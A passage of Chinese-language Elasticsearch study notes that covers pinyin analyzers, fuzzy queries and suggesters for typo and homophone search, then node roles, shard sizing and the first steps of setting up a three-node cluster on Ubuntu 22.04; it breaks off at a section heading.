&quot;filter&quot;: &#123;        &quot;pinyin_filter&quot;: &#123;          &quot;type&quot;: &quot;pinyin&quot;,          &quot;keep_full_pinyin&quot;: true,          &quot;keep_original&quot;: true,          &quot;keep_first_letter&quot;: true,          &quot;keep_separate_first_letter&quot;: false,          &quot;limit_first_letter_length&quot;: 16,          &quot;lowercase&quot;: true,          &quot;remove_duplicated_term&quot;: true        &#125;      &#125;    &#125;  &#125;,  &quot;mappings&quot;: &#123;    &quot;properties&quot;: &#123;      &quot;content&quot;: &#123;        &quot;type&quot;: &quot;text&quot;,        &quot;analyzer&quot;: &quot;my_pinyin_analyzer&quot;,        &quot;search_analyzer&quot;: &quot;ik_smart&quot;      &#125;    &#125;  &#125; &#125;</code></p><h2 id="解决同音字问题的关键配置"><a href="#解决同音字问题的关键配置" class="headerlink" title="解决同音字问题的关键配置"></a>解决同音字问题的关键配置</h2><p>为了避免同音字过度匹配的问题，需要合理配置索引和搜索分析器<a href="https://blog.csdn.net/LINING_GG/article/details/128212935">1</a><a href="https://elasticsearch.cn/question/11575">2</a>：</p><ul><li><p><strong>索引时</strong>：使用包含拼音的分析器，同时保留原始中文</p></li><li><p><strong>搜索时</strong>：使用不包含拼音的分析器，避免中文搜索时匹配到所有同音字</p></li></ul><p>json</p><p><code>&#123;   &quot;content&quot;: &#123;    &quot;type&quot;: &quot;text&quot;,    &quot;analyzer&quot;: &quot;my_pinyin_analyzer&quot;,    &quot;search_analyzer&quot;: &quot;ik_smart&quot;  &#125; &#125;</code></p><h2 id="多字段搜索策略"><a href="#多字段搜索策略" class="headerlink" title="多字段搜索策略"></a>多字段搜索策略</h2><p>为了平衡搜索的准确性和召回率，可以使用多字段搜索策略<a href="https://blog.csdn.net/AiMaiShanHuHai/article/details/144430879">3</a>：</p><p>json</p><p><code>&#123;   &quot;query&quot;: &#123;    &quot;multi_match&quot;: &#123;      &quot;query&quot;: &quot;如加&quot;,      &quot;fields&quot;: [        &quot;content^5&quot;,        &quot;content.pinyin^2&quot;      ],      &quot;operator&quot;: &quot;or&quot;    &#125;  &#125; &#125;</code></p><h2 id="错别字处理方案"><a href="#错别字处理方案" class="headerlink" title="错别字处理方案"></a>错别字处理方案</h2><h2 id="模糊查询（Fuzzy-Query）"><a href="#模糊查询（Fuzzy-Query）" class="headerlink" title="模糊查询（Fuzzy Query）"></a>模糊查询（Fuzzy Query）</h2><p>Elasticsearch 提供了基于莱文斯坦距离（Levenshtein Distance）的模糊查询功能来处理拼写错误<a href="https://blog.csdn.net/Flying_Fish_roe/article/details/142754951">4</a><a href="https://elasticsearch.cn/article/14056">5</a>。</p><p>json</p><p><code>&#123;   &quot;query&quot;: &#123;    &quot;fuzzy&quot;: &#123;      &quot;content&quot;: &#123;        &quot;value&quot;: &quot;如加&quot;,        &quot;fuzziness&quot;: &quot;AUTO&quot;      &#125;    &#125;  &#125; &#125;</code></p><h2 id="核心参数配置"><a href="#核心参数配置" class="headerlink" title="核心参数配置"></a>核心参数配置</h2><p><strong>fuzziness 参数</strong>：控制编辑距离的大小<a href="https://blog.csdn.net/weixin_42692506/article/details/101555035">6</a><a href="https://www.jianshu.com/p/eb5665a9fd70">7</a></p><ul><li><p><code>AUTO</code>：自动模式，根据词长度调整编辑距离</p></li><li><p><code>0,1,2</code>：固定的编辑距离值</p></li><li><p><code>AUTO:3,6</code>：自定义阈值的自动模式</p></li></ul><p><strong>prefix_length 参数</strong>：设置前缀匹配长度，提高查询性能<a href="https://www.jianshu.com/p/eb5665a9fd70">7</a></p><p>json</p><p><code>&#123;   &quot;query&quot;: &#123;    &quot;match&quot;: &#123;      &quot;content&quot;: &#123;        &quot;query&quot;: &quot;如加&quot;,        &quot;fuzziness&quot;: &quot;AUTO&quot;,        &quot;prefix_length&quot;: 1      &#125;    &#125;  &#125; &#125;</code></p><h2 id="建议器（Suggester）纠错"><a href="#建议器（Suggester）纠错" class="headerlink" title="建议器（Suggester）纠错"></a>建议器（Suggester）纠错</h2><p>使用 Term Suggester 进行拼写纠错<a href="https://elasticsearch.cn/article/14056">5</a>：</p><p>json</p><p><code>&#123;   &quot;suggest&quot;: &#123;    &quot;text_suggest&quot;: &#123;      &quot;text&quot;: &quot;如加&quot;,      &quot;term&quot;: &#123;        &quot;field&quot;: &quot;content&quot;,        &quot;suggest_mode&quot;: &quot;always&quot;,        &quot;min_word_length&quot;: 2,        &quot;max_edits&quot;: 2      &#125;    &#125;  &#125; &#125;</code></p><h2 id="综合解决方案"><a href="#综合解决方案" class="headerlink" title="综合解决方案"></a>综合解决方案</h2><h2 id="完整的索引配置"><a href="#完整的索引配置" class="headerlink" title="完整的索引配置"></a>完整的索引配置</h2><p>json</p><p><code>PUT /comprehensive_index &#123;   &quot;settings&quot;: &#123;    &quot;analysis&quot;: &#123;      &quot;analyzer&quot;: &#123;        &quot;pinyin_analyzer&quot;: &#123;          &quot;tokenizer&quot;: &quot;ik_max_word&quot;,          &quot;filter&quot;: [&quot;pinyin_filter&quot;]        &#125;,        &quot;search_analyzer&quot;: &#123;          &quot;tokenizer&quot;: &quot;ik_smart&quot;        &#125;      &#125;,      &quot;filter&quot;: &#123;        &quot;pinyin_filter&quot;: &#123;          &quot;type&quot;: &quot;pinyin&quot;,          &quot;keep_full_pinyin&quot;: true,          &quot;keep_original&quot;: true,          &quot;keep_first_letter&quot;: true,          &quot;lowercase&quot;: true,          &quot;remove_duplicated_term&quot;: true        &#125;      &#125;    &#125;  &#125;,  &quot;mappings&quot;: &#123;    &quot;properties&quot;: &#123;      &quot;content&quot;: &#123;        &quot;type&quot;: &quot;text&quot;,        &quot;analyzer&quot;: &quot;pinyin_analyzer&quot;,        &quot;search_analyzer&quot;: &quot;search_analyzer&quot;,        &quot;fields&quot;: &#123;          &quot;keyword&quot;: &#123;            &quot;type&quot;: &quot;keyword&quot;          &#125;,          &quot;pinyin&quot;: &#123;            &quot;type&quot;: &quot;text&quot;,            &quot;analyzer&quot;: &quot;pinyin_analyzer&quot;          &#125;        &#125;      &#125;    &#125;  &#125; &#125;</code></p><h2 id="多策略搜索查询"><a href="#多策略搜索查询" class="headerlink" title="多策略搜索查询"></a>多策略搜索查询</h2><p>结合模糊查询和拼音搜索的综合查询策略<a href="https://blog.csdn.net/AiMaiShanHuHai/article/details/144430879">3</a>：</p><p>json</p><p><code>&#123;   &quot;query&quot;: &#123;    &quot;bool&quot;: &#123;      &quot;should&quot;: [        &#123;          &quot;match&quot;: &#123;            &quot;content&quot;: &#123;              &quot;query&quot;: &quot;如加&quot;,              &quot;boost&quot;: 3            &#125;          &#125;        &#125;,        &#123;          &quot;match&quot;: &#123;            &quot;content.pinyin&quot;: &#123;              &quot;query&quot;: &quot;如加&quot;,              &quot;boost&quot;: 2            &#125;          &#125;        &#125;,        &#123;          &quot;fuzzy&quot;: &#123;            &quot;content&quot;: &#123;              &quot;value&quot;: &quot;如加&quot;,              &quot;fuzziness&quot;: &quot;AUTO&quot;,              &quot;boost&quot;: 1            &#125;          &#125;        &#125;      ]    &#125;  &#125; &#125;</code></p><h2 id="最佳实践建议"><a href="#最佳实践建议" class="headerlink" title="最佳实践建议"></a>最佳实践建议</h2><ol><li><p><strong>性能优化</strong>：使用 <code>prefix_length</code> 参数减少模糊查询的计算量<a href="https://www.jianshu.com/p/eb5665a9fd70">7</a></p></li><li><p><strong>准确性平衡</strong>：合理设置 <code>fuzziness</code> 值，避免过度匹配<a href="https://blog.csdn.net/weixin_42692506/article/details/101555035">6</a></p></li><li><p><strong>权重调整</strong>：通过 <code>boost</code> 参数调整不同匹配策略的权重<a href="https://blog.csdn.net/AiMaiShanHuHai/article/details/144430879">3</a></p></li><li><p><strong>索引优化</strong>：根据业务需求选择合适的分词器组合<a href="https://blog.csdn.net/LINING_GG/article/details/128212935">1</a></p></li></ol><p>通过以上配置和策略，可以有效处理”如加、如佳”等谐音字问题和”如加”等错别字问题，提升中文搜索的用户体验和准确性<a href="https://elastic-search-in-action.medcl.com/3.site_search/3.3.search_box/pinyin_support/">8</a><a href="https://developer.baidu.com/article/details/2817267">9</a>。</p><ol><li><a href="https://blog.csdn.net/LINING_GG/article/details/128212935">https://blog.csdn.net/LINING_GG&#x2F;article&#x2F;details&#x2F;128212935</a></li><li><a href="https://elasticsearch.cn/question/11575">https://elasticsearch.cn/question/11575</a></li><li><a href="https://blog.csdn.net/AiMaiShanHuHai/article/details/144430879">https://blog.csdn.net/AiMaiShanHuHai/article/details/144430879</a></li><li><a href="https://blog.csdn.net/Flying_Fish_roe/article/details/142754951">https://blog.csdn.net/Flying_Fish_roe&#x2F;article&#x2F;details&#x2F;142754951</a></li><li><a href="https://elasticsearch.cn/article/14056">https://elasticsearch.cn/article/14056</a></li><li><a href="https://blog.csdn.net/weixin_42692506/article/details/101555035">https://blog.csdn.net/weixin_42692506&#x2F;article&#x2F;details&#x2F;101555035</a></li><li><a href="https://www.jianshu.com/p/eb5665a9fd70">https://www.jianshu.com/p/eb5665a9fd70</a></li><li><a href="https://elastic-search-in-action.medcl.com/3.site_search/3.3.search_box/pinyin_support/">https://elastic-search-in-action.medcl.com/3.site_search&#x2F;3.3.search_box&#x2F;pinyin_support&#x2F;</a></li><li><a href="https://developer.baidu.com/article/details/2817267">https://developer.baidu.com/article/details/2817267</a></li><li><a href="https://elastic-search-in-action.medcl.com/3.site_search/3.3.search_box/fuzzy_query/">https://elastic-search-in-action.medcl.com/3.site_search&#x2F;3.3.search_box&#x2F;fuzzy_query&#x2F;</a></li><li><a href="https://blog.csdn.net/u013041642/article/details/94416631">https://blog.csdn.net/u013041642/article/details/94416631</a></li><li><a href="https://www.cnblogs.com/wufengtinghai/p/15800498.html">https://www.cnblogs.com/wufengtinghai/p/15800498.html</a></li><li><a href="https://elasticsearch.cn/question/11351">https://elasticsearch.cn/question/11351</a></li><li><a href="https://www.xiaoyeshiyu.com/post/f969d9e9.html">https://www.xiaoyeshiyu.com/post/f969d9e9.html</a></li><li><a href="https://hackernoon.com/how-to-use-fuzzy-query-matches-in-elasticsearch-dh1h3167">https://hackernoon.com/how-to-use-fuzzy-query-matches-in-elasticsearch-dh1h3167</a></li><li><a href="https://abhishek376.wordpress.com/2017/09/30/correcting-typos-and-spelling-mistakes-using-elasticsearch/">https://abhishek376.wordpress.com/2017/09/30/correcting-typos-and-spelling-mistakes-using-elasticsearch/</a></li><li><a href="https://blog.csdn.net/tsx668899/article/details/135041636">https://blog.csdn.net/tsx668899/article/details/135041636</a></li><li><a href="https://cloud.tencent.com/developer/article/2220244">https://cloud.tencent.com/developer/article/2220244</a></li><li><a href="https://patents.google.com/patent/CN106202153A/zh">https://patents.google.com/patent/CN106202153A/zh</a></li><li><a href="https://blog.csdn.net/Li_services/article/details/119052731">https://blog.csdn.net/Li_services&#x2F;article&#x2F;details&#x2F;119052731</a></li><li><a href="https://wjw465150.github.io/Elasticsearch/4_1_Dealing_with_language.html">https://wjw465150.github.io/Elasticsearch/4_1_Dealing_with_language.html</a></li><li><a href="https://www.cnblogs.com/wufengtinghai/p/15811554.html">https://www.cnblogs.com/wufengtinghai/p/15811554.html</a></li><li><a href="https://developer.aliyun.com/article/1331418">https://developer.aliyun.com/article/1331418</a></li><li><a href="https://www.aliyun.com/sswb/channel_535235_8.html">https://www.aliyun.com/sswb/channel_535235_8.html</a></li><li><a href="https://cloud.tencent.com/developer/article/1509405">https://cloud.tencent.com/developer/article/1509405</a></li><li><a href="https://blog.51cto.com/topic/eszhongwenjiucuosuggest.html">https://blog.51cto.com/topic/eszhongwenjiucuosuggest.html</a></li></ol><h1 id="二、实操：搭建-ES-环境"><a href="#二、实操：搭建-ES-环境" class="headerlink" title="二、实操：搭建 ES 环境"></a>二、实操：搭建 ES 环境</h1><h3 id="1-ES-高可用实现"><a href="#1-ES-高可用实现" class="headerlink" title="1. ES 高可用实现"></a>1. ES 高可用实现</h3><h4 id="1-1-ES-组件"><a href="#1-1-ES-组件" class="headerlink" title="1.1. ES 组件"></a>1.1. ES 组件</h4><p>ES 中的集群节点有不同的职责划分，每个节点都可以有以下角色：</p><ol><li>&#x3D;&#x3D;Master&#x3D;&#x3D;：<ol><li><font color="#00b0f0">配置参数</font>：<ol><li>node.master</li></ol></li><li><font color="#00b0f0">默认值</font>：<ol><li>true</li></ol></li><li><font color="#00b0f0">角色职责</font>：<ol><li>Master 角色本身不直接执行业务操作，仅参与 Leader（主节点）的选举。</li><li>Leader 的核心职责：<ol><li><font color="#7030a0">集群状态维护</font><ol><li>接收并处理各节点的心跳，实时跟踪节点的加入与离开</li><li>持集群元数据的最新视图，确保集群一致性</li></ol></li><li><font color="#7030a0">分片与副本管理</font><ol><li>负责分片（primary 和 replica）的分配、重分配和均衡</li><li>监控副本健康状况，触发副本恢复或重建</li></ol></li><li><font color="#7030a0">索引管理</font><ol><li>管理所有索引的元数据信息（名称、设置、映射等）</li><li>处理索引的创建、删除、修改请求，保证操作原子性</li></ol></li><li><font color="#7030a0">全局配置管理</font><ol><li>管理 ILM（Index Lifecycle Management）、Index Templates、Component Templates 等全局配置</li><li>协调集群范围内的参数变更，广播至所有节点</li></ol></li></ol></li><li>注意事项：<ol><li>ES 中的 Master 实际上是 Master-eligible（候选主节点），真正的主节点（Leader）由候选节点通过选举产生，这里我说由 Master 选举 Leader 是方便记忆</li><li>Master 节点必须获得 <strong>超过</strong> N&#x2F;2 + 1 的投票（不含“等于”）才能成为 Leader，N 为历史上加入过集群的节点总数，即使节点已下线，其记录仍计入 N。因此我们必须保证集群中大多数节点存活时才可完成选举，例如 3 节点必须保证 2 节点存活。</li><li>此外我们需要注意，Master 节点的数量一般为奇数个，这样能有效防止脑裂</li></ol></li></ol></li></ol></li><li>&#x3D;&#x3D;Data&#x3D;&#x3D;：<ol><li><font color="#00b0f0">配置参数</font>：<ol><li>node.data</li></ol></li><li><font color="#00b0f0">默认值</font>：<ol><li>true</li></ol></li><li><font color="#00b0f0">角色职责</font>：<ol><li>存储文档数据，持有 primary 和 replica 分片。</li><li>执行数据相关的操作，如 CRUD、查询、聚合分析等。</li><li>处理分片级别的恢复、快照和搜索请求，通常负载较高</li></ol></li></ol></li><li>&#x3D;&#x3D;Ingest&#x3D;&#x3D;：<ol><li><font color="#00b0f0">配置参数</font>：<ol><li>node.ingest</li></ol></li><li><font color="#00b0f0">默认值</font>：<ol><li>true</li></ol></li><li><font color="#00b0f0">角色职责</font>：<ol><li>在文档数据存储之前进行预处理，通过 Ingest Pipelines 应用各种 Processor（如 grok、date、set、geoip 等）对文档进行解析、转换、清洗。</li><li>将处理后的文档转发到 Data 节点，减轻客户端或外部系统的预处理压力。</li></ol></li></ol></li><li>&#x3D;&#x3D;Coordinating&#x3D;&#x3D;：<ol><li><font color="#00b0f0">配置参数</font>：<ol><li>无需显式配置，所有节点默认为协调节点。</li></ol></li><li><font color="#00b0f0">默认值</font>：<ol><li>默认开启，无法修改</li></ol></li><li><font color="#00b0f0">角色职责</font>：<ol><li>路作为客户端请求的入口，解析和路由请求到 Master、Data 或 Ingest 节点。</li><li>将各分片返回的部分结果进行聚合、排序、分页等操作后，统一返回给用户。</li><li>管理 Scroll、Search After、Multi-Search 等跨分片的复杂查询流程。</li></ol></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>默认情况下，每个节点都同时承担上述四种角色，这对测试环境足够；</li><li>在大型生产环境中，建议拆分角色：<ul><li><strong>Data</strong> 角色负载最重，应部署在 CPU 与内存资源充足的服务器上；</li><li><strong>Master</strong> 角色建议部署在轻量节点或专用节点上，避免与数据节点争抢资源；</li><li><strong>Ingest</strong> 角色可根据吞吐量高低独立部署，以优化预处理性能；</li><li><strong>Coordinating</strong> 角色可部署在与客户端网络延迟低的节点上，提升请求路由效率</li></ul></li></ol></blockquote><hr><h4 id="1-2-ES-精细化把控（ES-本身）"><a href="#1-2-ES-精细化把控（ES-本身）" class="headerlink" title="1.2. ES 精细化把控（ES 本身）"></a>1.2. ES 精细化把控（ES 本身）</h4><p>&#x3D;&#x3D;1.一个 ES 索引库最多能存储多少数据量&#x3D;&#x3D;<br>ES 索引库的数据量是所有主分片数据量的总和，理论上来说一个 ES 索引库的数据量是无上限的</p><p>&#x3D;&#x3D;2.一个 ES 索引库推荐存储多少数据量&#x3D;&#x3D;<br>将单个索引库的存储量控制在几十 GB 到数百 GB之间，既能保证查询和恢复效率，又方便管理与扩展。</p><p>&#x3D;&#x3D;3.一个分片最多能存储多少数据量&#x3D;&#x3D;<br>Lucene引擎对单个分片设定了21.47亿文档的硬性限制（Integer.MAX_VALUE - 128）。假设平均文档大小为1KB，单分片理论存储上限可达20TB，但实际生产环境中受以下因素制约：</p><ol><li><font color="#00b0f0">内存分配</font>：<ol><li>JVM堆内存需满足倒排索引与文档值的驻留需求，建议每GB堆内存对应不超过20GB索引数据</li></ol></li><li><font color="#00b0f0">磁盘性能</font>：<ol><li>机械硬盘场景下单个分片超过100GB时，查询延迟可能呈指数级增长</li></ol></li><li><font color="#00b0f0">恢复时效</font>：<ol><li>50GB分片在万兆网络环境下恢复时间约为30分钟，超过该阈值将影响故障转移效率</li></ol></li></ol><p>&#x3D;&#x3D;4.一个分片建议存储多少数据量&#x3D;&#x3D;<br>单分片数据量建议 10 - 50 GB，极端场景下不超过 100GB，下面是特殊场景：</p><ol><li><font color="#00b0f0">日志分析</font>：<ol><li>可将单分片扩容至 100 GB，但需配合冷热节点架构</li></ol></li><li><font color="#00b0f0">向量搜索</font>：<ol><li>单分片建议上限压缩至20GB，以确保高维数据检索效率；</li></ol></li><li><font color="#00b0f0">时序数据</font>：<ol><li>热数据分片控制在30GB，温&#x2F;冷数据可放大至80GB。</li></ol></li></ol><p>&#x3D;&#x3D;5.建议怎样分片、副本&#x3D;&#x3D;<br>主分片数 &#x3D; 总数据量 &#x2F; 单分片最大数据量，一般是总数据量 &#x2F; 50GB<br>副本数，你要有这个概念，一个超高可以的集群，副本数建议2-3个，50GB 以下你就一个副本数就行了<br>注意事项：<br>    1. 主分片数应尽量是节点数的整数倍，以确保负载均衡<br>    2. 主分片数一旦设置无法更改，需提前规划数据增长<br>    3. 每个节点的分片数 + 副本数建议 20~30个（官方建议是20 ~ 40）个</p><p>&#x3D;&#x3D;数据一致性&#x3D;&#x3D;</p><p>&#x3D;&#x3D;节点安排&#x3D;&#x3D;</p><hr><h4 id="1-3-ES-企业级高可用集群要求"><a href="#1-3-ES-企业级高可用集群要求" class="headerlink" title="1.3. ES 企业级高可用集群要求"></a>1.3. ES 企业级高可用集群要求</h4><p>&#x3D;&#x3D;6.建议怎样安排节点&#x3D;&#x3D;<br>Master 节点数为奇数个</p><hr><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h3><h4 id="2-1-分布式集群环境搭建"><a href="#2-1-分布式集群环境搭建" class="headerlink" title="2.1. 分布式集群环境搭建"></a>2.1. 分布式集群环境搭建</h4><h5 id="2-1-1-架构说明"><a href="#2-1-1-架构说明" class="headerlink" title="2.1.1. 架构说明"></a>2.1.1. 架构说明</h5><hr><h5 id="2-1-2-环境要求"><a href="#2-1-2-环境要求" class="headerlink" title="2.1.2. 环境要求"></a>2.1.2. 环境要求</h5><ol><li>&#x3D;&#x3D;硬件要求&#x3D;&#x3D;：<ol><li>3 台服务器</li><li>2 核 CPU</li><li>4 GB 内存</li><li>50 GB 可用存储空间</li></ol></li><li>&#x3D;&#x3D;系统、软件要求&#x3D;&#x3D;：<ol><li>Ubuntu 22.04</li><li>ElasticSearch 8.18</li><li>相关工具<ol><li>openssl<ol><li>导出 CA 公钥</li></ol></li><li>dos2unix<ol><li>将 脚本转化为 Unix 格式</li></ol></li><li>chrony<ol><li>时间同步</li></ol></li></ol></li><li>时间同步</li><li>创建 es 用户</li><li>关闭 Swap 分区</li><li>开放 9200、9300 TCP端口</li><li>设置主机名、主机名解析</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>由于可能在 192.168.136.8 部署 <code>Kibana</code>，CPU 和内存可稍多些</li></ol></blockquote><hr><h5 id="2-1-3-节点列表"><a href="#2-1-3-节点列表" class="headerlink" title="2.1.3. 节点列表"></a>2.1.3. 节点列表</h5><table><thead><tr><th>IP</th><th>主机名</th><th>角色</th></tr></thead><tbody><tr><td>192.168.136.8</td><td>es-node1</td><td>master-eligible、data、ingest、coordinating</td></tr><tr><td>192.168.136.9</td><td>es-node2</td><td>master-eligible、data、ingest、coordinating</td></tr><tr><td>192.168.136.10</td><td>es-node3</td><td>master-eligible、data、ingest、coordinating</td></tr></tbody></table><hr><h5 id="2-1-4-相关工具"><a href="#2-1-4-相关工具" class="headerlink" title="2.1.4. 相关工具"></a>2.1.4. 相关工具</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. openssl</span><br><span class="hljs-built_in">command</span> -v openssl &gt;/dev/null 2&gt;&amp;1 || <span class="hljs-built_in">sudo</span> apt-get install -y openssl<br><br><br><span class="hljs-comment"># 2. dos2unix</span><br><span class="hljs-built_in">command</span> -v dos2unix &gt;/dev/null 2&gt;&amp;1 || <span class="hljs-built_in">sudo</span> apt-get install -y dos2unix<br><br><br><span class="hljs-comment"># 3. chrony</span><br><span class="hljs-built_in">command</span> -v chrony &gt;/dev/null 2&gt;&amp;1 || <span class="hljs-built_in">sudo</span> apt-get install -y chrony<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-5-时间同步"><a href="#2-1-5-时间同步" class="headerlink" title="2.1.5. 时间同步"></a>2.1.5. 时间同步</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 chrony</span><br><span class="hljs-built_in">sudo</span> apt install -y chrony<br><br><br><span class="hljs-comment"># 2. 启动并开启自启动 chrony</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> chrony &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl start chrony<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-6-创建-es-用户"><a href="#2-1-6-创建-es-用户" class="headerlink" title="2.1.6. 创建 es 用户"></a>2.1.6. 创建 es 用户</h5><p>由于 ES 不允许以 root 用户身份运行（我们仅在运行 ES 时使用 es 用户），因此我们需要创建一个名为 <code>es</code> 的用户，并使用该用户进行后续的操作和配置。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># <span class="hljs-number">1</span>. 删除已存在 <span class="hljs-built_in">es</span> 用户（包括其主目录）<br>userdel -r <span class="hljs-built_in">es</span><br><br><br># <span class="hljs-number">2</span>. 新增 <span class="hljs-built_in">es</span> 用户<br>useradd <span class="hljs-built_in">es</span><br><br><br># <span class="hljs-number">3</span>. 为 <span class="hljs-built_in">es</span> 用户设置密码（wq666）<br>passwd <span class="hljs-built_in">es</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>为用户设置密码时，两次回车键就是无密码，我们这里设置 <code>wq666</code></li></ol></blockquote><hr><h5 id="2-1-7-关闭-Swap-分区"><a href="#2-1-7-关闭-Swap-分区" class="headerlink" title="2.1.7. 关闭 Swap 分区"></a>2.1.7. 关闭 Swap 分区</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 将 内容注释</span><br>vim <span class="hljs-regexp">/etc/</span>fstab<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">## 将此内容进行注释</span><br><span class="hljs-string">## /swap.img       none    swap    sw      0       0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 2. 立即关闭 Swap 分区</span><br>swapoff -a<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-8-开放-9200、9300-TCP-端口"><a href="#2-1-8-开放-9200、9300-TCP-端口" class="headerlink" title="2.1.8. 开放 9200、9300 TCP 端口"></a>2.1.8. 开放 9200、9300 TCP 端口</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ufw <span class="hljs-literal">allow</span> <span class="hljs-number">9200</span>/tcp &amp;&amp; sudo ufw <span class="hljs-literal">allow</span> <span class="hljs-number">9300</span>/tcp<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>TCP 端口就是我们常说的 HTTP 端口</li></ol></blockquote><hr><h5 id="2-1-9-设置主机名、主机名互相解析"><a href="#2-1-9-设置主机名、主机名互相解析" class="headerlink" title="2.1.9. 设置主机名、主机名互相解析"></a>2.1.9. 设置主机名、主机名互相解析</h5><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 1. 设置主机名</span><br><span class="hljs-comment"># 1.1. 192.168.136.8</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">es-node1</span><br><br><span class="hljs-comment"># 1.2. 192.168.136.9</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">es-node2</span><br><br><span class="hljs-comment"># 1.3. 192.168.136.10</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">es-node3</span><br><br><br><span class="hljs-comment"># 2. 设置主机名互相解析</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">vim</span> /<span class="hljs-string">etc</span>/<span class="hljs-string">hosts</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">192.168.136.8 es-node1</span><br><span class="hljs-string">192.168.136.9 es-node2</span><br><span class="hljs-string">192.168.136.10 es-node3</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h5 id="2-1-10-创建-mystudy-es-目录"><a href="#2-1-10-创建-mystudy-es-目录" class="headerlink" title="2.1.10. 创建 mystudy&#x2F;es 目录"></a>2.1.10. 创建 mystudy&#x2F;es 目录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /mystudy/es<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-11-下载并安装-ES"><a href="#2-1-11-下载并安装-ES" class="headerlink" title="2.1.11. 下载并安装 ES"></a>2.1.11. 下载并安装 ES</h5><p>&#x3D;&#x3D;1.下载 ES&#x3D;&#x3D;<br>从 <a href="https://www.elastic.co/cn/downloads/past-releases#elasticsearch">ES 下载地址</a>下载 ES 安装包：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250416201625864.png"></p><p>&#x3D;&#x3D;2.安装 ES&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 1. 将 ES 安装包上传至 /mystudy/es 目录</span><br><br><br><span class="hljs-comment"># 2. 进入 /mystudy/es 目录</span><br><span class="hljs-attribute">cd</span> /mystudy/es<br><br><br><span class="hljs-comment"># 3. 删除已存在 ES 目录</span><br><span class="hljs-attribute">rm</span> -rf /mystudy/es/elasticsearch<br><br><br><span class="hljs-comment"># 4. 解压</span><br><span class="hljs-attribute">tar</span> -zxvf  elasticsearch-<span class="hljs-number">8</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span>-linux-x86_64.tar.gz -C /mystudy/es<br><br><br><span class="hljs-comment"># 5. 重命名</span><br><span class="hljs-attribute">mv</span> elasticsearch-<span class="hljs-number">8</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span> elasticsearch<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-12-创建存放-ES-数据的目录"><a href="#2-1-12-创建存放-ES-数据的目录" class="headerlink" title="2.1.12. 创建存放 ES 